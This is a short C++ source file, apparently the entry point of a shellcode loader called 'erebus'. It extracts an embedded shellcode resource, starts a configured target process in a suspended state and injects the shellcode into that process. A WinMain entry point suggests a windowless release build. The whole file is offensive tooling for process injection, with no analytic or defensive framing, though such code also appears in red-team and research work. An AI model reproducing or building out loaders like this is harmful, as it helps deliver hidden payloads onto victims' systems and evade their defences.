#include "loader.hpp"
#include "config.hpp"

VOID entry(void)
{
	erebus::config.injection_method = ExecuteShellcode;

	HANDLE process_handle, thread_handle = INVALID_HANDLE_VALUE;
	SIZE_T shellcode_size;

	auto shellcode = erebus::StageResource(IDR_EREBUS_BIN1, L"EREBUS_BIN", &shellcode_size);

	wchar_t cmdline[] = CONFIG_TARGET_PROCESS;

	erebus::CreateProcessSuspended(cmdline, &process_handle, &thread_handle);

	erebus::config.injection_method(shellcode, shellcode_size, process_handle, thread_handle);

	return;
}

#if _DEBUG

int main()
{
	entry();
	return 0;
}

#else
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	entry();
	return 0;
}
#endif
